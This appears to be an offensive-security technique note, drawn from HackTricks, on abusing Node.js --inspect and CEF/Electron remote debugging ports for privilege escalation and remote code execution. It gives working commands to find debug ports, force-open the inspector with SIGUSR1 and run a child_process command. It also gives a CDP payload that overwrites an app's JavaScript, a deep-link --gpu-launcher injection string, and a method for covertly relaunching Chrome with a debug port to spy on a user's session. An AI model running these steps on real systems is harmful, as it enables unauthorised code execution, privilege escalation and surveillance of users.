---
title: "Node.js --inspect and CEF/Chromium Debugger Abuse"
type: technique
tags: [linux, nodejs, electron, cef, debugger, privilege-escalation, rce]
phase: privilege-escalation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-linux]
---

# Node.js --inspect and CEF/Chromium Debugger Abuse

## Node --inspect to RCE

A Node process started with `--inspect` (default `127.0.0.1:9229`) exposes a debugger with full access to the JS execution environment: anyone who reaches the port gets code execution as that process, a real LPE when it runs as a higher-privileged user or in a container. Enumerate for the listener and the per-process UUID (`ws://127.0.0.1:9229/<uuid>`).

```bash
ss -ltnp | grep -E '9229|9222'              # inspector / CEF debug ports
kill -s SIGUSR1 <node-pid>                  # force a running node proc to open the inspector (default port)
node inspect 127.0.0.1:9229                 # attach
# in the debug console:
exec("process.mainModule.require('child_process').exec('id > /tmp/pwn')")
```

`SIGUSR1` is the container-friendly trick: you cannot restart the process with `--inspect` (killing PID 1 kills the container), but you can signal it to open the inspector in place. Same-origin/DNS-rebind guards (Node checks the `Host` header is an IP/`localhost`) block driving the inspector by a bare SSRF HTTP request, so you need a real WebSocket client; use `taviso/cefdebug` to find and inject into local inspectors.

## CEF/Electron --remote-debugging-port (CDP)

CEF/Electron apps use `--remote-debugging-port=9222` and speak the Chrome DevTools Protocol (CDP). CDP is not direct Node RCE, but is still abusable: `Browser.setDownloadBehavior` to point downloads at the app's own source dir then overwrite its JS with a payload; `--gpu-launcher` argument injection via a custom-URI-scheme deep link (CVE-2021-38112 style); and stealthy post-exploitation surveillance by killing all Chrome procs then relaunching with the debug port + `--restore-last-session` and port-forwarding it out.

```bash
# CDP file-overwrite over the debugger WebSocket
# ws.send(JSON.stringify({id:1,method:"Browser.setDownloadBehavior",params:{behavior:"allow",downloadPath:"/code/"}}))
# deep-link arg injection: workspaces://anything%20--gpu-launcher=%22/tmp/x.sh%22@CODE
```

## Sources

- HackTricks linux-hardening (ingest slug `hacktricks-linux`).
